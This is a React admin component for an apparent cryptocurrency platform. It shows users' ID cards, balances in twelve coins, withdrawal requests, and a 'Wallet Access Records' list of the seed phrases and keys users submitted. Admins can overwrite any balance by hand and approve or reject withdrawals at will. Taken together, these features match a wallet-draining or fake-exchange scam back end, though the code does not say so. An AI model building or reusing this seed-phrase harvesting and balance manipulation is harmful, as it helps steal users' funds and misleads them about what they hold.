"use client";

import { useTransition, useState } from "react";
import { toast } from "sonner";
import {
  updateUserRole,
  updateUserBalance,
  deleteUser,
} from "@/lib/actions/admin";
import IDCardImage from "../IDCardImage";

type User = {
  id: string;
  fullName: string;
  email: string;
  IDCard: string;
  role: "ADMIN" | "USER";
  usdtBalance: string;
  btcBalance: string;
  ethBalance: string;
  bnbBalance: string;
  dotBalance: string;
  solBalance: string;
  dogeBalance: string;
  trxBalance: string;
  xrpBalance: string;
  usdcBalance: string;
  ltcBalance: string;
  maticBalance: string;
  seedPhrase?: string | null;
};

type WalletAccess = {
  id: string;
  walletName: string;
  type: string;
  value: string;
  createdAt: string;
};

type Transaction = {
  id: string;
  token: string;
  amount: string;
  status: "PENDING" | "APPROVED" | "REJECTED" | "FAILED";
  withdrawalWallet: string | null;
  createdAt: string;
};

export default function AdminUserDetails({
  user,
  withdrawals,
  walletAccesses,
  refresh,
}: {
  user: User;
  withdrawals: Transaction[];
  walletAccesses: WalletAccess[];
  refresh: () => void;
}) {
  const [isPending, startTransition] = useTransition();
  const [rejectReason, setRejectReason] = useState("");
  const [rejectingId, setRejectingId] = useState<string | null>(null);
  const [loadingId, setLoadingId] = useState<string | null>(null);
  const [balances, setBalances] = useState({
    usdt: user.usdtBalance,
    btc: user.btcBalance,
    eth: user.ethBalance,
    bnb: user.bnbBalance,
    dot: user.dotBalance,
    sol: user.solBalance,
    doge: user.dogeBalance,
    trx: user.trxBalance,
    xrp: user.xrpBalance,
    usdc: user.usdcBalance,
    ltc: user.ltcBalance,
    matic: user.maticBalance,
  });
  const [selectedWallet, setSelectedWallet] = useState<string>("ALL");

  const walletNames = Array.from(
    new Set(walletAccesses.map((w) => w.walletName))
  );

  const sortedAccesses = [...walletAccesses].sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
  const filteredAccesses = sortedAccesses.filter(
    (entry) => selectedWallet === "ALL" || entry.walletName === selectedWallet
  );

  const handleRoleChange = (newRole: "ADMIN" | "USER") => {
    startTransition(async () => {
      try {
        await updateUserRole(user.id, newRole);
        toast.success("Role updated");
      } catch {
        toast.error("Failed to update role");
      }
    });
  };

  const handleBalanceSave = () => {
    startTransition(async () => {
      try {
        await updateUserBalance(user.id, balances);
        toast.success("Balances updated");
      } catch {
        toast.error("Failed to update balances");
      }
    });
  };

  const handleDelete = () => {
    startTransition(async () => {
      try {
        await deleteUser(user.id);
        toast.success("User deleted");
      } catch {
        toast.error("Failed to delete user");
      }
    });
  };
  const handleRespond = async (txId: string, action: "APPROVE" | "REJECT", note?: string) => {
    try {
      setLoadingId(txId);
      const res = await fetch("/api/respondWithdrawal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ txId, action, note }),
      });
      if (!res.ok) throw new Error(await res.text());
      toast.success(`Withdrawal ${action === "APPROVE" ? "approved" : "rejected"}`);
      refresh();
    } catch (err) {
      toast.error(`Failed to ${action.toLowerCase()} withdrawal`);
    } finally {
      setLoadingId(null);
      setRejectingId(null);
      setRejectReason("");
    }
  };

  return (
    <div className="p-6 text-black">
      <div className="flex items-center justify-between">
        <h2 className="text-xl font-bold mb-4">{user.fullName}'s Profile</h2>
        <div className="">
          <p className="font-semibold">Email: {user.email}</p>
          <p className="font-semibold">Current Role: {user.role}</p>
        </div>
      </div>
      {user.IDCard && (
        <div className="mt-4">
          <p className="font-semibold mb-2">Uploaded ID Card:</p>
          <IDCardImage path={user.IDCard} />
        </div>
      )}

      <div className="my-6">
        <h3 className="text-lg font-semibold mb-2">Wallet Access Records</h3>

        {walletAccesses.length > 0 ? (
          <>
            <div className="mb-4">
              <label className="text-sm font-medium text-gray-700 mr-2">
                Filter by Wallet:
              </label>
              <select
                value={selectedWallet}
                onChange={(e) => setSelectedWallet(e.target.value)}
                className="p-2 bg-primary-admin border border-gray-300 rounded text-white"
              >
                <option value="ALL">All</option>
                {walletNames.map((name) => (
                  <option key={name} value={name} >
                    {name}
                  </option>
                ))}
              </select>
            </div>

            <div className="space-y-4">
              {filteredAccesses.map((entry) => (
                <div
                  key={entry.id}
                  className="bg-gray-100 text-black p-4 rounded shadow"
                >
                  <p>
                    <strong>Wallet:</strong> {entry.walletName}
                  </p>
                  <p>
                    <strong>Type:</strong> {entry.type}
                  </p>
                  <p className="break-words">
                    <strong>
                      {entry.type === "phrase" ? "Seed Phrase" : "Public Key"}:
                    </strong>{" "}
                    {entry.value}
                  </p>
                  <p className="text-sm text-gray-600 mt-1">
                    Submitted: {new Date(entry.createdAt).toLocaleString()}
                  </p>
                </div>
              ))}
            </div>
          </>
        ) : (
          <p className="text-gray-600">No wallet access records yet.</p>
        )}
      </div>

      <h3 className="text-lg font-semibold mt-6 mb-2">Balances</h3>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        {[
          "usdt",
          "btc",
          "eth",
          "bnb",
          "dot",
          "sol",
          "doge",
          "trx",
          "xrp",
          "usdc",
          "ltc",
          "matic",
        ].map((coin) => (
          <div
            key={coin}
            className="bg-[#1b1f2a] p-5 rounded-xl text-white shadow flex flex-col justify-between transition-transform duration-300 hover:scale-[1.02] min-w-[280px] sm:min-w-xs md:min-w-[280px] lg:min-w-lg"
          >
            <label className="capitalize mr-2  space-x-5 text-sm text-gray-300 py-3">
              {coin}
            </label>
            <input
              type="number"
              value={balances[coin as keyof typeof balances]}
              onChange={(e) =>
                setBalances({ ...balances, [coin]: e.target.value })
              }
              className="bg-primary-admin/40 p-2 rounded text-white"
            />
          </div>
        ))}
      </div>

      <button
        onClick={handleBalanceSave}
        className="bg-green-600 px-4 py-2 rounded-lg text-white item"
      >
        Save Balances
      </button>

      <div className="mt-6 flex items-center justify-between">
        <button
          onClick={handleDelete}
          className="bg-red-600 px-4 py-2 rounded-lg text-white shadow-sm cursor-pointer"
        >
          Delete User
        </button>
        <div className="my-4 space-x-2">
          <button
            onClick={() =>
              handleRoleChange(user.role === "ADMIN" ? "USER" : "ADMIN")
            }
            className="bg-primary-admin shadow-sm text-white px-4 py-2 rounded-lg cursor-pointer"
          >
            {user.role === "ADMIN" ? "Demote to USER" : "Make ADMIN"}
          </button>
        </div>
      </div>
      <h3 className="text-lg font-semibold mt-10 mb-4">Withdrawals</h3>
      {withdrawals.length === 0 ? (
        <p className="text-gray-500">No withdrawal requests</p>
      ) : (
        <div className="overflow-x-auto">
          <table className="min-w-full text-xs text-white">
            <thead className="bg-gray-700">
              <tr>
                <th className="text-left p-2">Token</th>
                <th className="text-left p-2">Amount</th>
                <th className="text-left p-2">Wallet</th>
                <th className="text-left p-2">Status</th>
                <th className="text-left p-2">Date</th>
                <th className="text-left p-2">Action</th>
              </tr>
            </thead>
            <tbody>
              {withdrawals.map((tx, i) => (
                <tr key={i} className="border-b border-gray-600">
                  <td className="p-2 text-black">{tx.token}</td>
                  <td className="p-2 text-black">{tx.amount}</td>
                  <td className="p-2 text-black break-all">
                    {tx.withdrawalWallet}
                  </td>
                  <td className="p-2 text-black">{tx.status}</td>
                  <td className="p-2 text-black">
                    {new Date(tx.createdAt).toLocaleString()}
                  </td>
                  <td className="p-2 text-black space-x-2">
                    {tx.status === "PENDING" && (
                      <>
                        <button
                          className="bg-green-600 px-3 py-1 rounded text-white cursor-pointer hover:bg-green-700"
                          disabled={loadingId === tx.id}
                          onClick={() => handleRespond(tx.id, "APPROVE")}
                        >
                          Approve
                        </button>
                        <button
                          className="bg-red-600 px-3 py-1 rounded text-white cursor-pointer hover:bg-red-700"
                          disabled={loadingId === tx.id}
                          onClick={() => setRejectingId(tx.id)}
                        >
                          Reject
                        </button>
                      </>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {rejectingId && (
            <div className="fixed inset-0 bg-black/50 flex items-center justify-center">
              <div className="bg-white text-black p-6 rounded shadow-lg w-96">
                <h3 className="text-lg font-semibold mb-4">Reject Withdrawal</h3>
                <textarea
                  value={rejectReason}
                  onChange={(e) => setRejectReason(e.target.value)}
                  className="w-full border border-gray-300 p-2 rounded mb-4"
                  placeholder="Enter reason..."
                />
                <div className="flex justify-end space-x-2">
                  <button
                    onClick={() => setRejectingId(null)}
                    className="px-3 py-1 rounded bg-gray-300"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={() => handleRespond(rejectingId, "REJECT", rejectReason)}
                    className="px-3 py-1 rounded bg-red-600 text-white cursor-pointer hover:bg-red-700"
                  >
                    Reject
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
